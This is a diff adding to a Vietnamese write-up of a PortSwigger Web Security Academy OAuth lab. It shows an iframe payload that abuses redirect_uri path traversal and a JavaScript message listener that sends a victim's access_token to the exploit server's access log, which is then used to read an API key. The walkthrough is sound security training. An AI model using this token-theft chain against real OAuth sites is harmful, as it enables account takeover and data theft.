@@ -239,4 +239,22 @@ Do vậy thực hiện phương thức như cách trong Lab #4, ta sẽ chuẩn 
 ```html
 <iframe src='<HOST-LAB-DOMAIN>/auth?client_id=q9id6iqgkkwkytx9jb4jr&redirect_uri=https://0aa700bf0431cf8980cebcf900af00bf.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=792677125&scope=openid%20profile%20email'></iframe>
 ```
+Thêm đoạn code sau bên dưới để trigger người dùng sau khi truy cập vào link trên sẽ lấy listen link redirect nhận được và lấy giá trị URI fetch lên / của exploit server luôn => Sau này hacker sẽ lấy thông tin này ra từ access log của Exploit Server.
+```javascript
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
+```
+
+Sau khi Store payload và gửi đến victim => Check access log sẽ thấy dữ liệu access_token:
+<img width="552" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/86d2bcb6-8adc-495d-bd63-d99676d5dd9a">
+
+Sử dụng token đó truy cập vào link `/me` (tương tự lab trước):
+<img width="486" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/830ee4e1-9fc4-4390-8679-180bd467d12b">
+
+Sau khi lấy đc thông tin apikey, tực hiện submit và LAB Solved!
+<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23566d32-39a8-4ca4-bf0e-bd9899b72c37">
+
 
